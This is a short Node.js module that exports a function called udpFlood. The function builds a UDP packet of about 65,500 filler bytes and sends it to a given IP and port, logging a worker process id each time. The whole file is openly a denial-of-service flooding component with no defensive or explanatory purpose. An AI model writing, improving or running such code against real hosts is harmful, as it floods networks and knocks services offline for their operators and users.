let dgram = require('dgram');

function udpFlood(ip, port, timeout, pid) {
    return new Promise((resolve, reject) => {
        let output = "";

        for (let i = 65500; i >= 0; i--) {
            output += "X";
        }

        let socket = dgram.createSocket('udp4');
        let message = Buffer.from(output);

        socket.send(message, 0, message.length, port, ip, function (err, bytes) {
            if (err) throw err;
            console.log('Worker pid: ' + pid + ' sent package UDP with ' + bytes + ' bytes to ' + ip + ':' + port + ' from ' + socket.address().address + ':' + socket.address().port);
            resolve();
        });

        socket.on('error', (err, rinfo) => {
            reject(err);
            // console.log(`server got: ${msg} from ${rinfo.address}:${rinfo.port}`);
        });
        // socket.on("close", function () {
        //     console.log("socket closed");
        //     process.exit(-1);
        // });
    });
}

module.exports = udpFlood;